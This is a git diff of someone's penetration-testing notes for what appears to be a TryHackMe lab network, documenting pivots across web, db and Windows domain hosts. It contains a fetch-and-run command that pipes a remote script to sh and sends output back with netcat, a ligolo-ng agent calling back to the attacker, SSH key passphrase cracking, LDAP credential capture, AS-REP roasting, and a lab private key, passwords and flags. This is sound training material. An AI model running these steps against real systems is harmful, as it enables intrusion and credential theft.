@@ -6,6 +6,10 @@
 https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX
 --------------------------------------
 
+//Add and delete for getting back to mark.
+sudo ip route add 10.200.171.101/32 dev ligolo
+sudo ip route add 10.200.171.122/32 dev ligolo 
+
 // Introduction
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ## Storyline
@@ -71,22 +75,18 @@ root.txt - In C:\Users\Administrator\root.txt
 
 
 |================================================================
-- Name: socbot3000 
+- Name: web
 - IP Address: 10.200.171.10
 - OS: Ubuntu 24.04.1 LTS/6.8.0-1017-aws/x86_64
 
 //CREDS:
-
+	//SSH Key Passphrase(id_ed25519): password 
 //Flags:
-	//WEB:
-		#User:	THM{82f9d06e-9a52-44d5-98c2-aef647805216} 
-		#System:THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}
+	#User:	THM{82f9d06e-9a52-44d5-98c2-aef647805216} 
+	#System:THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-// WEB (10.200.171.10)
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
 // Scan
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -315,7 +315,7 @@ uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt
 THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}
 
-// Extra (as root)
+// FOUND PrivateKey (id_ed25519)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ls /root/.ssh/
 authorized_keys  id_ed25519  id_ed25519.pub
@@ -334,35 +334,18 @@ FLHQ6nBC63Zb8VP9GxtfiSewAd+OkRPe8B/3c=
 //Change perms
 chmod 600 id_ed25519
 
+//Cracking the SSH Key Passphrase
+ssh2john id_ed25519 > sshKey.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt sshKey.hash
+
+password         (id_ed25519)
+
+//SSH Key Passphrase: password
+
 //Log-in
 ssh -i id_ed25519 socbot3000@10.200.171.11
-//Username xGh05t
 
-Enter your hacker alias (max 20 chars): xGh05t
-
-[+] Your new account has been created:
-    user: xGh05t
-
-[!] Copy this **PRIVATE KEY** now and keep it safe. You won’t be shown it again.
-
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACB6tbxqVjMCyzedOV0oLtVrb9y6b7jLjzmVw2RrTA60QwAAAJDFN6gQxTeo
-EAAAAAtzc2gtZWQyNTUxOQAAACB6tbxqVjMCyzedOV0oLtVrb9y6b7jLjzmVw2RrTA60Qw
-AAAECB8xrxCJzSaEmV+Xx/gvIO9SCR0jOeuYDS7810/hoCmXq1vGpWMwLLN505XSgu1Wtv
-3LpvuMuPOZXDZGtMDrRDAAAAB3Jvb3RAZGIBAgMEBQY=
------END OPENSSH PRIVATE KEY-----
-You can save it as, e.g., ./malhare_ed25519 and run:
-    chmod 600 ./malhare_ed25519
-    ssh -i ./malhare_ed25519 xGh05t@10.200.171.11
-
-
-As a final reward, your flag for making it this far: THM{114136cc-e9ab-4303-a825-18cb24d60d90}
-Farewell, burrower. The warren awaits…
-
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
+//Upon login, a banner appeared, followed by an interactive utility that allowed the creation of a new account.
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -377,8 +360,7 @@ Farewell, burrower. The warren awaits…
 //CREDS:
 
 //Flags:
-	//DB:
-		#THM{114136cc-e9ab-4303-a825-18cb24d60d90}
+	#THM{114136cc-e9ab-4303-a825-18cb24d60d90}
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
@@ -420,6 +402,7 @@ EAAAAAtzc2gtZWQyNTUxOQAAACB6tbxqVjMCyzedOV0oLtVrb9y6b7jLjzmVw2RrTA60Qw
 AAAECB8xrxCJzSaEmV+Xx/gvIO9SCR0jOeuYDS7810/hoCmXq1vGpWMwLLN505XSgu1Wtv
 3LpvuMuPOZXDZGtMDrRDAAAAB3Jvb3RAZGIBAgMEBQY=
 -----END OPENSSH PRIVATE KEY-----
+
 You can save it as, e.g., ./malhare_ed25519 and run:
     chmod 600 ./malhare_ed25519
     ssh -i ./malhare_ed25519 xGh05t@10.200.171.11
@@ -428,34 +411,27 @@ You can save it as, e.g., ./malhare_ed25519 and run:
 As a final reward, your flag for making it this far: THM{114136cc-e9ab-4303-a825-18cb24d60d90}
 Farewell, burrower. The warren awaits…
 
+//THM{114136cc-e9ab-4303-a825-18cb24d60d90}
+
 Connection to 10.200.171.11 closed.
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 //COnnection
 2026-03-19 21:01:48 EDT -- 
-ssh -i malhare_ed25519 xGh05t@10.200.171.11
+ssh -MS db -i malhare_ed25519 xGh05t@10.200.171.11
 
 //SUCESS!!
 
-// Initial
+// Initial Look
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 id
-hostname
-ls -la ~
-cat /home/xGh05t/user.txt 2>/dev/null || find / -name "user.txt" -readable 2>/dev/null
-ip a
-cat /etc/hosts
 uid=1004(xGh05t) gid=1004(xGh05t) groups=1004(xGh05t)
+
+hostname
 db
-total 28
-drwxr-x--- 4 xGh05t xGh05t 4096 Mar 20 00:24 .
-drwxr-xr-x 7 root   root   4096 Mar 20 00:06 ..
--rw-r--r-- 1 xGh05t xGh05t  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 xGh05t xGh05t 3771 Feb 25  2020 .bashrc
-drwx------ 2 xGh05t xGh05t 4096 Mar 20 00:24 .cache
--rw-r--r-- 1 xGh05t xGh05t  807 Feb 25  2020 .profile
-drwx------ 2 xGh05t xGh05t 4096 Mar 20 00:06 .ssh
+
+ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -465,49 +441,434 @@ drwx------ 2 xGh05t xGh05t 4096 Mar 20 00:06 .ssh
 2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
     link/ether 02:94:58:01:b1:37 brd ff:ff:ff:ff:ff:ff
     inet 10.200.171.11/24 metric 100 brd 10.200.171.255 scope global dynamic ens5
-       valid_lft 2533sec preferred_lft 2533sec
+       valid_lft 3163sec preferred_lft 3163sec
     inet6 fe80::94:58ff:fe01:b137/64 scope link 
        valid_lft forever preferred_lft forever
-127.0.0.1 localhost
 
-# The following lines are desirable for IPv6 capable hosts
-::1 ip6-localhost ip6-loopback
-fe00::0 ip6-localnet
-ff00::0 ip6-mcastprefix
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-ff02::3 ip6-allhosts
+ip route
+default via 10.200.171.1 dev ens5 proto dhcp src 10.200.171.11 metric 100 
+10.200.0.2 via 10.200.171.1 dev ens5 proto dhcp src 10.200.171.11 metric 100 
+10.200.171.0/24 dev ens5 proto kernel scope link src 10.200.171.11 metric 100 
+10.200.171.1 dev ens5 proto dhcp scope link src 10.200.171.11 metric 100
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-// Privesc -- Linux
+// Static Nmap binary on Target(db)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-//Move it
-cp /usr/share/peass/linpeas/linpeas.sh .
+//Local
+wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
 
-// Download, execute from memory, & save output on kali
-  // KALI term1
-sudo python3 -m http.server 80
-  // KALI term2
-nc -lvnp 443 | tee linpeas.out
+scp -o "ControlPath=db" nmap-x64.tar.gz .:
 
-  // CurlTarget
-curl 10.249.1.2:80/linpeas.sh | sh | nc 10.249.1.2 443
+//Remote
+mkdir nmap
+mv nmap-x64.tar.gz nmap
+cd nmap
 
-// View linpeas output
-less -R linpeas.out
+tar -xvzf nmap-x64.tar.gz
 
----
+//Start Scans
+./nmap -n -sn 10.200.171.0/24 --exclude 10.200.171.250
 
+Nmap scan report for 10.200.171.10
+Host is up (0.00032s latency).
+Nmap scan report for 10.200.171.11
+Host is up (0.000078s latency).
+Nmap scan report for 10.200.171.101
+Host is up (0.00043s latency).
+Nmap done: 255 IP addresses (3 hosts up) scanned in 2.34 seconds
+
+arp -an
+? (10.200.171.122) at 02:8a:84:b9:58:a7 [ether] on ens5
+? (10.200.171.131) at 02:bb:80:9b:a5:35 [ether] on ens5
+? (10.200.171.121) at 02:70:e2:db:c5:73 [ether] on ens5
+? (10.200.171.10) at 02:89:56:24:4c:09 [ether] on ens5
+? (10.200.171.250) at 02:0f:ed:75:29:5b [ether] on ens5
+? (10.200.171.102) at 02:b9:72:bc:87:71 [ether] on ens5
+? (10.200.171.103) at 02:68:6a:4a:ca:c7 [ether] on ens5
+? (10.200.171.1) at 02:85:41:f7:16:91 [ether] on ens5
+? (10.200.171.141) at 02:74:c1:73:50:cf [ether] on ens5
+? (10.200.171.101) at 02:57:ae:d0:fe:d3 [ether] on ens5
+
+ip neighbor show
+10.200.171.122 dev ens5 lladdr 02:8a:84:b9:58:a7 STALE 
+10.200.171.131 dev ens5 lladdr 02:bb:80:9b:a5:35 STALE 
+10.200.171.121 dev ens5 lladdr 02:70:e2:db:c5:73 STALE 
+10.200.171.10 dev ens5 lladdr 02:89:56:24:4c:09 STALE 
+10.200.171.250 dev ens5 lladdr 02:0f:ed:75:29:5b STALE 
+10.200.171.102 dev ens5 lladdr 02:b9:72:bc:87:71 STALE 
+10.200.171.103 dev ens5 lladdr 02:68:6a:4a:ca:c7 STALE 
+10.200.171.1 dev ens5 lladdr 02:85:41:f7:16:91 REACHABLE 
+10.200.171.141 dev ens5 lladdr 02:74:c1:73:50:cf STALE 
+10.200.171.101 dev ens5 lladdr 02:57:ae:d0:fe:d3 STALE
+
+//Created a target list
+cat targets.txt    
+10.200.171.10
+10.200.171.101
+10.200.171.102
+10.200.171.103
+10.200.171.121
+10.200.171.122
+10.200.171.131
+10.200.171.141
+
+//NOTE: Removed .1 and .250
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Ligolo-ng SET-UP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+sudo apt install ligolo-ng
+
+//CreateWorkingDir
+mkdir proxy
+cd proxy
+
+//1. StartProxy(Kali)
+sudo ligolo-proxy -selfcert
+
+//Prompts
+Enable WebUI? → n  
+Allow CORS? → n
+
+You should now see:
+Listening on 0.0.0.0:11601
+
+//2. Transfer Agent to Target
+which ligolo-agent
+/usr/bin/ligolo-agent
+
+scp -o "ControlPath=db" /usr/bin/ligolo-agent .:/tmp/agent
+
+//3. Run Agent (Target)
+/tmp/agent -connect 10.249.1.2:11601 -ignore-cert &
+
+//4. Accept Session (Back on Kali)
+#Check Sessions
+session
+start
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Add Route for next Target
+sudo ip route add 10.200.171.101/32 dev ligolo
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+|================================================================
+- Name: Server1 
+- IP Address: 10.200.171.101
+- OS: 10.0.17763 N/A Build 17763/x64 
+
+//CREDS:
+	anne.clark@ai.vanchat.loc : Wbqs8193
+	qw2.amy.young: password1!
+//Flags:
+	#User:	THM{20f7d7ac-5768-4883-a33f-09e4a738bff1}
+	#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Scan
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2026-03-20 21:16:50 EDT -- 
+sudo nmap -Pn -sV -sC -p- 10.200.171.101 -oN ai.vanchat.nmap
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: VanChat Printer Hub \xE2\x80\x94 AD Settings Tester
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: AI
+|   NetBIOS_Domain_Name: AI
+|   NetBIOS_Computer_Name: SERVER1
+|   DNS_Domain_Name: ai.vanchat.loc
+|   DNS_Computer_Name: Server1.ai.vanchat.loc
+|   DNS_Tree_Name: vanchat.loc
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-03-21T01:20:28+00:00
+|_ssl-date: 2026-03-21T01:20:33+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=Server1.ai.vanchat.loc
+| Not valid before: 2025-10-28T10:32:43
+|_Not valid after:  2026-04-29T10:32:43
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Web
+// http://10.200.171.101:80
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#Found this on the site:
+//From the web interface, I obtained an internal email address:
+anne.clark@ai.vanchat.loc
+
+//DC Hostname / IP
+10.200.171.122
+
+//LDAP Port
+389
+
+//The web application seems to allow arbitrary IP input for directory services.
+//Lets attempted to intercept LDAP authentication traffic.
+
+//Test Site
+nc -lnvp 1111 //Set-up listener on db
+
+DC Hostname / IP / LDAP Port
+10.200.171.11 / 1111
+
+//It connects back to DB
+anne.clark@ai.vanchat.locWbqs8193
+
+//Possible Creds
+anne.clark@ai.vanchat.loc
+Wbqs8193
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//SSH Tunneling
+ssh -MS db -i malhare_ed25519 xGh05t@10.200.171.11 -L 8081:10.200.171.101:80 -L 33891:10.200.171.101:3389
+
+//RDP
+xfreerdp3 /sec:nla /cert:ignore /v:127.0.0.1:33891 /u:qw2.amy.young /p:'password1!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+
+//Success!!!
+
+#user flag
+type C:\user.txt
+//THM{20f7d7ac-5768-4883-a33f-09e4a738bff1}
+
+whoami
+ai\qw2.amy.young
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+net user qw2.amy.young /domain
+The request will be processed at a domain controller for domain ai.vanchat.loc.
+
+User name                    qw2.amy.young
+Full Name                    Amy Young
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/2/2025 6:10:18 PM
+Password expires             Never
+Password changeable          11/3/2025 6:10:18 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   3/21/2026 4:43:55 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Level 2 Operator     *Domain Users
+
+
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+
+|================================================================
+- Name: dc1
+- IP Address: 10.200.171.122
+- OS: 
+- Notes: 
+
+//CREDS:
+	qw2.amy.young@AI.VANCHAT.LOC : password1!
+//Flags:
+#User:
+#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Based on the WebSite http://10.200.171.101/ .122 might be a DomainControler.
+
+sudo ip route add 10.200.171.122/32 dev ligolo
+
+//Scan
+sudo nmap -Pn -sV -sC -p- 10.200.171.122 -oN DC.nmap
+
+PORT    STATE SERVICE      VERSION
+53/tcp  open  domain       Simple DNS Plus
+88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-21 02:52:25Z)
+389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: vanchat.loc, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-21T02:52:40+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC1.ai.vanchat.loc
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC1.ai.vanchat.loc
+| Not valid before: 2025-10-31T04:19:27
+|_Not valid after:  2026-10-31T04:19:27
+636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: vanchat.loc, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-21T02:52:40+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC1.ai.vanchat.loc
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC1.ai.vanchat.loc
+| Not valid before: 2025-10-31T04:19:27
+|_Not valid after:  2026-10-31T04:19:27
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+//LDAP
+ldapsearch -x -H ldap://10.200.171.122 -s base
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:
+domainFunctionality: 6
+forestFunctionality: 6
+domainControllerFunctionality: 7
+rootDomainNamingContext: DC=vanchat,DC=loc
+ldapServiceName: vanchat.loc:dc1$@AI.VANCHAT.LOC
+isGlobalCatalogReady: TRUE
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+supportedLDAPPolicies: MaxPoolThreads
+supportedLDAPPolicies: MaxPercentDirSyncRequests
+supportedLDAPPolicies: MaxDatagramRecv
+supportedLDAPPolicies: MaxReceiveBuffer
+supportedLDAPPolicies: InitRecvTimeout
+supportedLDAPPolicies: MaxConnections
+supportedLDAPPolicies: MaxConnIdleTime
+supportedLDAPPolicies: MaxPageSize
+supportedLDAPPolicies: MaxBatchReturnMessages
+supportedLDAPPolicies: MaxQueryDuration
+supportedLDAPPolicies: MaxDirSyncDuration
+supportedLDAPPolicies: MaxTempTableSize
+supportedLDAPPolicies: MaxResultSetSize
+supportedLDAPPolicies: MinResultSets
+supportedLDAPPolicies: MaxResultSetsPerConn
+supportedLDAPPolicies: MaxNotificationPerConn
+supportedLDAPPolicies: MaxValRange
+supportedLDAPPolicies: MaxValRangeTransitive
+supportedLDAPPolicies: ThreadMemoryLimit
+supportedLDAPPolicies: SystemMemoryLimitPercent
+supportedControl: 1.2.840.113556.1.4.319
+supportedControl: 1.2.840.113556.1.4.801
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 1.2.840.113556.1.4.528
+supportedControl: 1.2.840.113556.1.4.417
+supportedControl: 1.2.840.113556.1.4.619
+supportedControl: 1.2.840.113556.1.4.841
+supportedControl: 1.2.840.113556.1.4.529
+supportedControl: 1.2.840.113556.1.4.805
+supportedControl: 1.2.840.113556.1.4.521
+supportedControl: 1.2.840.113556.1.4.970
+supportedControl: 1.2.840.113556.1.4.1338
+supportedControl: 1.2.840.113556.1.4.474
+supportedControl: 1.2.840.113556.1.4.1339
+supportedControl: 1.2.840.113556.1.4.1340
+supportedControl: 1.2.840.113556.1.4.1413
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.10
+supportedControl: 1.2.840.113556.1.4.1504
+supportedControl: 1.2.840.113556.1.4.1852
+supportedControl: 1.2.840.113556.1.4.802
+supportedControl: 1.2.840.113556.1.4.1907
+supportedControl: 1.2.840.113556.1.4.1948
+supportedControl: 1.2.840.113556.1.4.1974
+supportedControl: 1.2.840.113556.1.4.1341
+supportedControl: 1.2.840.113556.1.4.2026
+supportedControl: 1.2.840.113556.1.4.2064
+supportedControl: 1.2.840.113556.1.4.2065
+supportedControl: 1.2.840.113556.1.4.2066
+supportedControl: 1.2.840.113556.1.4.2090
+supportedControl: 1.2.840.113556.1.4.2205
+supportedControl: 1.2.840.113556.1.4.2204
+supportedControl: 1.2.840.113556.1.4.2206
+supportedControl: 1.2.840.113556.1.4.2211
+supportedControl: 1.2.840.113556.1.4.2239
+supportedControl: 1.2.840.113556.1.4.2255
+supportedControl: 1.2.840.113556.1.4.2256
+supportedControl: 1.2.840.113556.1.4.2309
+supportedControl: 1.2.840.113556.1.4.2330
+supportedControl: 1.2.840.113556.1.4.2354
+supportedCapabilities: 1.2.840.113556.1.4.800
+supportedCapabilities: 1.2.840.113556.1.4.1670
+supportedCapabilities: 1.2.840.113556.1.4.1791
+supportedCapabilities: 1.2.840.113556.1.4.1935
+supportedCapabilities: 1.2.840.113556.1.4.2080
+supportedCapabilities: 1.2.840.113556.1.4.2237
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=vanchat,DC=loc
+serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura
+ tion,DC=vanchat,DC=loc
+schemaNamingContext: CN=Schema,CN=Configuration,DC=vanchat,DC=loc
+namingContexts: CN=Configuration,DC=vanchat,DC=loc
+namingContexts: CN=Schema,CN=Configuration,DC=vanchat,DC=loc
+namingContexts: DC=ForestDnsZones,DC=vanchat,DC=loc
+namingContexts: DC=ai,DC=vanchat,DC=loc
+namingContexts: DC=DomainDnsZones,DC=ai,DC=vanchat,DC=loc
+isSynchronized: TRUE
+highestCommittedUSN: 53742
+dsServiceName: CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C
+ N=Sites,CN=Configuration,DC=vanchat,DC=loc
+dnsHostName: DC1.ai.vanchat.loc
+defaultNamingContext: DC=ai,DC=vanchat,DC=loc
+currentTime: 20260321030626.0Z
+configurationNamingContext: CN=Configuration,DC=vanchat,DC=loc
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+sudo impacket-GetNPUsers -dc-ip 10.200.171.122 -request -outputfile dc.hash ai.vanchat.loc/anne.clark:Wbqs8193
+
+#Crack Hash
+hashcat -m 18200 dc.hash /usr/share/wordlists/rockyou.txt
+//password1!
+
+#Crack Hash2 (Test)
+john --wordlist=/usr/share/wordlists/rockyou.txt dc.hash
+//password1!       ($krb5asrep$23$qw2.amy.young@AI.VANCHAT.LOC)
+
+//> Login back into 101 with the new creds
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
